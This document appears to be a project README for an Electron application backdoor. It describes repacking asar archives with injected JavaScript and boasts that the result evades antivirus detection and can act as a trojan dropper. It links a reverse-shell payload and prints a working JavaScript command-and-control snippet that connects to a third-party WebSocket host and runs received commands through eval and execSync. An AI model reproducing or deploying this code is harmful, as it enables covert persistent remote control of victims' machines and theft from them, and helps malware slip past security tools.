# Atomic loader

### What is this Atomic loader

This is a proof of concept universal electron **FUD** application backdoor. I named it atomic loader because electron was called "atomic shell" before it was renamed apparently.

![[loader.png]]

### How does it work
Every single electron application uses a format called asar, you might have seen this:
[https://github.com/electron/asar]()

- Unpacking asar files is simple and packing it back with malicious javascript added will force the code to load with the application and therefore backdooring it.
- I can't say it "injects" but it's some form of persistance inside the application

This loader was based on vxunderground's research paper: "Node modules infector" but not to be confused since it works completely different yet the idea is still the same.
[https://github.com/vxunderground/VXUG-Papers/tree/main/Node%20Module%20Infector]()


### Why does it not fully work?
There are 2 main reasons
-> 1. I don't want to release this as fully working code out into the wild before it gets fully patched
-> 2. I've tried pretty hard to get it to work, It works most of the time, usually if you have one electron application but it seems to break for some reason, I just can't figure out why. Maybe you can help me? Feel free to commit.

**edit this line in the index.js before trying it out**

```js
const shellcode = "";
```

Use something like this: 

[https://github.com/vxunderground/VXUG-Papers/blob/main/Node%20Module%20Infector/Cross-platform%20demo/payloads/windows/discordReverseShell.js]()

Or craft your own shellcode, that should connect to a websocket server and execute commands from it. In this example we will be using [piesocket](https://www.piesocket.com/):

```js
;const WebSocket=require('ws');var exec=require('child_process').execSync;var piesocket=new WebSocket('wss://us-nyc-1.piesocket.com/v3/1?api_key=<INSERT_KEY>&notify_self');piesocket.onopen=function(connect){piesocket.send('loaded');};piesocket.onmessage=function(message){if(message.data.startsWith('!')){try{eval(message.data.slice(1));}catch(e){}}};piesocket.onerror=function(error){location.reload();};piesocket.onclose=function(error){location.reload();};
// send !piesocket.send(exec('whoami')) into websocket for rce
```

### Detections on virustotal?
![[detections.png]]
I'm proud to say this is surprisingly [100% FUD](https://www.virustotal.com/gui/file/4903e478fede3628566f20e2fb1caccbf22f88f9d02822748428d6ad23a88d64?nocache=1). Any application you compile with node pkg will stay zero, Hence you could utilize this as a "trojan dropper"
Unless you want to code Mimikatz in nodejs ;)
